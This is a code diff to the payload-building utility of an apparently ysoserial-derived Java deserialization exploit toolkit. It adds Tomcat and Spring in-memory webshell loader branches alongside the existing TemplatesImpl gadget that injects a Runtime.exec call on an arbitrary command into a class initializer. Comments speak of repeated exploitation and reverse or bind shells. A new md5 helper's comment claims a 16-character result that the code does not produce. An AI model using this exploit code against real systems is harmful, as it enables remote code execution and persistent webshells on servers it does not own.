@@ -1,6 +1,5 @@
 package org.erosion2020.util;
 
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -14,6 +13,8 @@ import javassist.CtClass;
 
 import java.io.Serializable;
 import java.lang.reflect.*;
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -103,40 +104,42 @@ public class Gadgets {
 
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.importPackage(command);
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
-
+        CommandCursor cursor = new CommandCursor(command);
+        String loader = cursor.next();
+        final CtClass clazz;
+        switch (loader) {
+            case "tomcat-loader":
+                clazz = pool.get(org.erosion2020.memshell.classloader.TemplatesImplTomcat.class.getName());
+                clazz.makeClassInitializer().insertBefore(
+                        "loader_pram = \""+cursor.next()+"\";"
+                );
+                break;
+            case "spring-loader":
+                clazz = pool.get(org.erosion2020.memshell.classloader.TemplatesImplSpring.class.getName());
+                clazz.makeClassInitializer().insertBefore(
+                        "loader_pram = \""+cursor.next()+"\";"
+                );
+                break;
+            default:
+                pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
+                pool.insertClassPath(new ClassClassPath(abstTranslet));
+                clazz = pool.get(Gadgets.StubTransletPayload.class.getName());
+                // run command in static initializer
+                // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+                String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                        command.replace("\\", "\\\\").replace("\"", "\\\"") +
+                        "\");";
+                clazz.makeClassInitializer().insertAfter(cmd);
+                // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+                clazz.setName("ysoserial.Pwner" + System.nanoTime());
+                CtClass superC = pool.get(abstTranslet.getName());
+                clazz.setSuperclass(superC);
+                break;
+        }
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
-
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
@@ -163,5 +166,23 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    public static String md5(String input) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
+            // 转为32位十六进制字符串
+            StringBuilder hexString = new StringBuilder();
+            for (byte b : digest) {
+                String hex = Integer.toHexString(0xff & b);
+                if (hex.length() == 1) hexString.append('0');
+                hexString.append(hex);
+            }
+            // 取前16位
+            return hexString.toString();
+        } catch (Exception e) {
+            throw new RuntimeException("MD5 calculation failed", e);
+        }
     }
 }
